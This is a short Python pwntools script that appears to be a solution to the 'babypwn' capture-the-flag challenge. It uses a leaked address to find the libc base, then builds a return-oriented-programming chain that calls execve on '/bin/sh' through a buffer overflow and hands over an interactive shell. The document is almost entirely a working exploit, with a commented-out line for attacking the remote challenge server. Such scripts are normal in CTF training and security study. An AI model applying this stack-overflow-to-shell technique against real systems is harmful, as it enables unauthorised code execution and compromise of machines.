from pwn import *

exe = ELF('babypwn', checksec = False)
r = process(exe.path)
libc = ELF('libc.so.6', checksec = False)
#r = remote("babypwn.pwn.midnightflag.fr", 16000)

r.recvuntil(b'leak: ')
libc_leak = r.recv(14).decode()
log.info("leak : " + libc_leak)
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - 0x60770
log.info("Libc: " + hex(libc.address))

pop_rax = libc.address + 0x0000000000045eb0
pop_rdi = libc.address+ 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx = libc.address + 0x000000000011f497
syscall = libc.address + 0x0000000000029db4

payload = b'a'*(0x40 + 0x8)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdx) + p64(0) + p64(0)
payload += p64(syscall)

#input()
r.sendline(payload)
r.interactive()